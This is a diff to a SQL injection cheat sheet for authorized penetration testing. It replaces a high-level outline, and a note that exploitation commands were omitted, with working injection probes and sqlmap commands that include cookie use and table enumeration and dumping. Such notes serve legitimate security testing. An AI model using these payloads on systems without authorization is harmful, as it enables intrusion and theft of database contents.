@@ -1,10 +1,23 @@
-# SQL Injection (Authorized targets only)
+# SQL Injection — Deep Dive (Authorized targets only)
 
-## High-level flow
-1) Identify parameters (GET/POST/JSON)
-2) Error-based clues in responses
-3) Boolean/time-based inference (safe tests)
-4) Confirm only within authorization; log evidence
+## Manual probes (non-destructive)
+'          # look for SQL errors
+ORDER BY 1 -- -
+' OR '1'='1' -- -
+1 AND SLEEP(3)  # time-based check
+
+## sqlmap quick usage (safe defaults)
+sqlmap -u "http://<IP>/item.php?id=1" --batch --random-agent --level=1 --risk=1 -p id -o
+
+## Authenticated targets / cookies
+sqlmap -u "http://<IP>/item.php?id=1" --cookie="PHPSESSID=..." --batch -p id
+
+## DB enumeration (when permitted)
+# sqlmap --dbs
+# sqlmap -D <db> --tables
+# sqlmap -D <db> -T <table> --columns
+# sqlmap -D <db> -T <table> --dump --stop=10
 
 ## Notes
-- Automated exploitation commands intentionally omitted. Use your approved internal playbook where permitted.
+- Keep --risk and --level conservative unless approved to increase.
+- Stop immediately on instability; notify stakeholders if required by RoE.
